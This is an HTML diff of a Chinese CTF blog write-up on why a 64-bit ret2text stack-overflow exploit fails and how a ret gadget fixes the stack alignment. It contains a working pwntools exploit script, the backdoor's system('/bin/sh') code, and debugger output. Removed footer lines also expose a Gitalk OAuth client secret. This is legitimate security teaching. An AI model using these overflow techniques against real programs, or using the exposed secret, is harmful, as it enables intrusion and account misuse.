+</span></span><span class="line"><span class="cl">  <span class="nf">gets</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">s</span><span class="p">,</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="n">argv</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;ok,bye!!!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// backdoor
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="nf">fun</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// fun 汇编
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">00000000004011</span><span class="mi">86</span> <span class="n">fun</span>             <span class="n">proc</span> <span class="n">near</span>
+</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">00000000004011</span><span class="mi">86</span> <span class="p">;</span> <span class="n">__unwind</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">00000000004011</span><span class="mi">86</span>                 <span class="n">push</span>    <span class="n">rbp</span>
+</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">00000000004011</span><span class="mi">87</span>                 <span class="n">mov</span>     <span class="n">rbp</span><span class="p">,</span> <span class="n">rsp</span>
+</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">00000000004011</span><span class="mi">8</span><span class="n">A</span>                 <span class="n">lea</span>     <span class="n">rdi</span><span class="p">,</span> <span class="n">command</span>    <span class="p">;</span> <span class="s">&#34;/bin/sh&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">00000000004011</span><span class="mi">91</span>                 <span class="n">call</span>    <span class="n">_system</span>         <span class="p">;</span> <span class="n">Call</span> <span class="n">Procedure</span>
+</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">00000000004011</span><span class="mi">96</span>                 <span class="n">nop</span>                     <span class="p">;</span> <span class="n">No</span> <span class="n">Operation</span>
+</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">00000000004011</span><span class="mi">97</span>                 <span class="n">pop</span>     <span class="n">rbp</span>
+</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">00000000004011</span><span class="mi">98</span>                 <span class="n">retn</span>                    <span class="p">;</span> <span class="n">Return</span> <span class="n">Near</span> <span class="n">from</span> <span class="n">Procedure</span>
+</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">00000000004011</span><span class="mi">98</span> <span class="p">;</span> <span class="p">}</span> <span class="c1">// starts at 401186
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">00000000004011</span><span class="mi">98</span> <span class="n">fun</span>             <span class="n">endp</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以解题思路就是通过main的gets函数进行栈溢出，覆盖返回地址，跳转到fun执行得到shell</p>
 <p>由此得到exp</p>
-<pre><code class="language-python">from pwn import *
-context(log_level=&quot;debug&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)
-p = process(&quot;./pwn1&quot;)
-payload = b'a'*23 + p64(0x401186)
-p.sendlineafter(b&quot;please input\n&quot;,payload)
-p.interactive()
-</code></pre>
-<p>但是get shell失败</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./pwn1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">23</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401186</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;please input</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是get shell失败</p>
 <h2 id="承">承</h2>
 <p>于是去百度了一下，发现各种wp的payload中间多塞了一个地址0x401198，即<code>payload = b'a'*23 + p64(0x401198) + p64(0x401186)</code>，试了一下确实可行</p>
 <p>文章原因说是为了恢复堆栈平衡，什么是堆栈平衡呢？</p>
@@ -444,17 +258,32 @@ p.interactive()
 <p>但payload里加了0x401198这个地址只是多执行了一条retn，最多也只是让esp+4之类的，这就能控制堆栈平衡了？我百思不得其解</p>
 <h2 id="转">转</h2>
 <p>拿gdb attach上去调发现了问题，跳转fun调用system函数时包括传参都是正常的，但会断在这一行汇编上</p>
-<pre><code class="language-nasm">0x7fad5eadef43    movaps xmmword ptr [rsp + 0x50], xmm0
-; 报错
-; Program received signal SIGSEGV, Segmentation fault.
-</code></pre>
-<p>在执行glibc中的system系统调用时，很可能会用到movaps指令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x7fad5eadef43</span>    <span class="nv">movaps</span> <span class="nv">xmmword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rsp</span> <span class="o">+</span> <span class="mh">0x50</span><span class="p">],</span> <span class="nv">xmm0</span>
+</span></span><span class="line"><span class="cl"><span class="c1">; 报错</span>
+</span></span><span class="line"><span class="cl"><span class="c1">; Program received signal SIGSEGV, Segmentation fault.</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在执行glibc中的system系统调用时，很可能会用到movaps指令</p>
 <p>movaps：在两个XMM寄存器或XMM寄存器与内存之间移动四个单精度浮点值。要求如果涉及内存，则内存地址必须按16字节对齐，即16进制表示的地址最后一位必须是0</p>
 <p>此处可打印rsp+0x50发现确实不符合要求</p>
-<pre><code class="language-shell">pwndbg&gt; p $rsp+0x50
-$1 = (void *) 0x7fffd26e4508
-</code></pre>
-<p>需要rsp+0x50按16字节对齐，更进一步来说，就是要rsp寄存器指向的地址按16字节对齐，而能够使rsp寄存器变化的无非call、retn、push、pop这些指令。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pwndbg&gt; p <span class="nv">$rsp</span>+0x50
+</span></span><span class="line"><span class="cl"><span class="nv">$1</span> <span class="o">=</span> <span class="o">(</span>void *<span class="o">)</span> 0x7fffd26e4508
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>需要rsp+0x50按16字节对齐，更进一步来说，就是要rsp寄存器指向的地址按16字节对齐，而能够使rsp寄存器变化的无非call、retn、push、pop这些指令。</p>
 <p>实际上，程序在正常运行情况下，编译器能保证编译出来的这些指令有序运作，当需要进行system调用时，一定是16字节对齐，使用movaps指令不会产生错误</p>
 <p>只有程序堆栈被非正常地修改，程序进行非预期行为时，才可能会出现无法对齐的情况，从而引发<code>Segmentation fault</code>，使程序异常退出</p>
 <p>再深入去想，由于是64位程序，所以rsp每次的变化要么是rsp-=8,要么是rsp+=8，故rsp所指地址最后一位其实只有两个取值，0或8，为0时堆栈对齐，为8时会引发错误</p>
@@ -472,179 +301,55 @@ $1 = (void *) 0x7fffd26e4508
 <h2 id="ref">Ref</h2>
 <ul>
 <li>
-<p><a href="https://stackoverflow.com/questions/60729616/segfault-in-ret2libc-attack-but-not-hardcoded-system-call">https://stackoverflow.com/questions/60729616/segfault-in-ret2libc-attack-but-not-hardcoded-system-call</a></p>
+<p><a href="https://stackoverflow.com/questions/60729616/segfault-in-ret2libc-attack-but-not-hardcoded-system-call" target="_blank" rel="noopener noreffer ">https://stackoverflow.com/questions/60729616/segfault-in-ret2libc-attack-but-not-hardcoded-system-call</a></p>
 </li>
 <li>
-<p><a href="https://research.csiro.au/tsblog/debugging-stories-stack-alignment-matters/">https://research.csiro.au/tsblog/debugging-stories-stack-alignment-matters/</a></p>
+<p><a href="https://research.csiro.au/tsblog/debugging-stories-stack-alignment-matters/" target="_blank" rel="noopener noreffer ">https://research.csiro.au/tsblog/debugging-stories-stack-alignment-matters/</a></p>
 </li>
 <li>
-<p><a href="https://ropemporium.com/guide.html">https://ropemporium.com/guide.html</a></p>
+<p><a href="https://ropemporium.com/guide.html" target="_blank" rel="noopener noreffer ">https://ropemporium.com/guide.html</a></p>
 </li>
 </ul>
 <p>以上，如有疏漏请师傅们指出</p>
-
-    </div>
-    <div class="article-footer">
-<blockquote class="mt-2x">
-  <ul class="post-copyright list-unstyled">
-    <li class="post-copyright-link hidden-xs">
-      <strong>本文链接: </strong>
-      <a href="https://blog.dx39061.top/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/" title="堆栈对齐——关于64位程序ret2text失败的溯源" target="_blank" rel="external">https://blog.dx39061.top/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/</a>
-    </li>
-    <li class="post-copyright-license">
-      <strong>License: </strong>
-        <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN</a>
-    </li>
-  </ul>
-</blockquote>
-
-<div class="panel panel-default panel-badger">
-  <div class="panel-body">
-    <figure class="media">
-      <div class="media-left">
-        <a href="https://github.com/DX39061" target="_blank" class="img-burn thumb-sm visible-lg">
-          <img src="https://blog.dx39061.top/avatar.png" class="img-rounded w-full" alt="">
-        </a>
-      </div>
-      <div class="media-body">
-        <h3 class="media-heading"><a href="https://github.com/DX39061" target="_blank"><span class="text-dark">DX3906</span><small class="ml-1x">吾辈所赴，是为星辰大海</small></a></h3>
-        <div></div>
-      </div>
-    </figure>
-  </div>
-</div>
-
-    </div>
-  </article>
-<section id="comments">
-</section>
-
-</div><nav class="bar bar-footer clearfix" data-stick-bottom>
-    <div class="bar-inner">
-        <ul class="pager pull-left">
-            <li class="prev">
-                <a href="https://blog.dx39061.top/2022/07/tea/" title="逆向人学密码（二）TEA"><i
-                        class="icon icon-angle-left"
-                        aria-hidden="true"></i><span>&nbsp;&nbsp;下一篇</span></a>
-            </li>
-            <li class="next">
-                <a href="https://blog.dx39061.top/2022/09/readme/"
-                    title="angr文档翻译（一）README"><span>上一篇&nbsp;&nbsp;</span><i
-                        class="icon icon-angle-right" aria-hidden="true"></i></a>
-            </li>
-            
-            <li class="toggle-toc">
-                <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false"
-                    title="文章目录" role="button">
-                    <span>[&nbsp;</span><span>文章目录</span>
-                    <i class="text-collapsed icon icon-anchor"></i>
-                    <i class="text-in icon icon-close"></i>
-                    <span>]</span>
-                </a>
-            </li>
-        </ul>
-        <div class="bar-right">
-            <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter"
-                data-mobile-sites="weibo,qq,qzone"></div>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-09-04</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://blog.dx39061.top/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/" data-title="堆栈对齐——关于64位程序ret2text失败的溯源" data-hashtags="pwn"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://blog.dx39061.top/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/" data-hashtag="pwn"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://blog.dx39061.top/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/" data-title="堆栈对齐——关于64位程序ret2text失败的溯源"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://blog.dx39061.top/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/" data-title="堆栈对齐——关于64位程序ret2text失败的溯源"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://blog.dx39061.top/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/" data-title="堆栈对齐——关于64位程序ret2text失败的溯源"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
         </div>
     </div>
-</nav>
 
-
-</main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
-<ul class="social-links">
-    <li><a href="https://github.com/DX39061" target="_blank" title="github" data-toggle=tooltip data-placement=top >
-            <i class="icon icon-github"></i></a></li>
-    <li><a href="https://blog.dx39061.top/index.xml" target="_blank" title="rss" data-toggle=tooltip data-placement=top >
-            <i class="icon icon-rss"></i></a></li>
-</ul>
-  <div class="copyright">
-    &copy;2022  -
-    2023
-    <div class="publishby">
-        Theme by <a href="https://github.com/xiaoheiAh" target="_blank"> xiaoheiAh </a>base on<a href="https://github.com/xiaoheiAh/hugo-theme-pure" target="_blank"> pure</a>.
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/pwn/">pwn</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
     </div>
-    
-  </div>
-</footer>
 
-<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_SVG"></script>
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-            showMathMenu: false, //disables context menu
-            tex2jax: {
-            inlineMath: [ ['$','$'], ['\\(','\\)'] ]
-           }
-    });
-</script>
+    <div class="post-nav"><a href="/2022/07/tea/" class="prev" rel="prev" title="逆向人学密码（二）TEA"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>逆向人学密码（二）TEA</a>
+            <a href="/2022/09/top_level_interface/" class="next" rel="next" title="angr文档翻译（二）Top Level Interface">angr文档翻译（二）Top Level Interface<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="giscus" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://giscus.app">Giscus</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.108.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/DX39061" target="_blank">DX3906</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
 
-
-<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
-<script>
-    window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
-</script>
-<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/highlight.min.js"></script>
-<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/languages/python.min.js" defer></script>
-<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/languages/javascript.min.js" defer></script><script>
-    hljs.configure({
-        tabReplace: '    ', 
-        classPrefix: ''     
-        
-    })
-    hljs.initHighlightingOnLoad();
-</script>
-<script src="https://blog.dx39061.top/js/application.min.e4989ab4dc212027af8773861b05b6bc333a1217f6b0a1b3377a3a3dbd454483.js"></script>
-<script src="https://blog.dx39061.top/js/plugin.min.738a460bf4317fac61717f1bca393e53d00973db9754d9f0a81c7312d5874840.js"></script>
-
-<script>
-    (function (window) {
-        var INSIGHT_CONFIG = {
-            TRANSLATION: {
-                POSTS: '文章',
-                PAGES: '页面',
-                CATEGORIES: '分类',
-                TAGS: '标签',
-                UNTITLED: '(未命名)',
-            },
-            ROOT_URL: 'https:\/\/blog.dx39061.top\/',
-            CONTENT_URL: 'https:\/\/blog.dx39061.top\/\/searchindex.json ',
-        };
-        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
-    })(window);
-</script>
-<script type="text/javascript" src="https://blog.dx39061.top/js/insight.min.716b0c6a00b68ccc31a2b65345f3412f4246ffa94a90f8e25d525528b4504f9937880692bbe619023233caba5d0a17ebe23d7cfb57cd3a88f23ea337ad5e4d00.js" defer></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
-<script>
-    tocbot.init({
-        
-        tocSelector: '.js-toc',
-        
-        contentSelector: '.js-toc-content',
-        
-        headingSelector: 'h1, h2, h3',
-        
-        hasInnerContainers: true,
-    });
-</script>
-
-<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
-<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
-<script src="https://cdn.bootcss.com/blueimp-md5/2.13.0/js/md5.min.js"></script>
-<script type="text/javascript">
-      const gitalk = new Gitalk({
-        clientID: '309208aa79ed1d5c7a67',
-        clientSecret: '59f662e2a49a4f9ce433a9b3b261e6aeadd7f5a6',
-        repo: 'DX39061.github.io',
-        owner: 'DX39061',
-        admin: ['DX39061'],
-        id: md5(location.pathname), 
-        distractionFreeMode: false 
-      });
-
-    gitalk.render('comments');
-</script>
-
-
-  </body>
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/index.umd.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":70},"comment":{"giscus":{"category":"General","categoryId":"DIC_kwDOIfJDVM4CTZ0v","darkTheme":"dark","emitMetadata":"0","inputPosition":"bottom","lang":"zh-CN","lazyLoading":false,"lightTheme":"light","mapping":"pathname","reactionsEnabled":"1","repo":"DX39061/DX39061.github.io","repoId":"R_kgDOIfJDVA"}},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"data":{"id-1":"DX3906's blog","id-2":"DX3906's blog"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":true,"left":"$$","right":"$$"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"},{"display":false,"left":"$","right":"$"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
 </html>
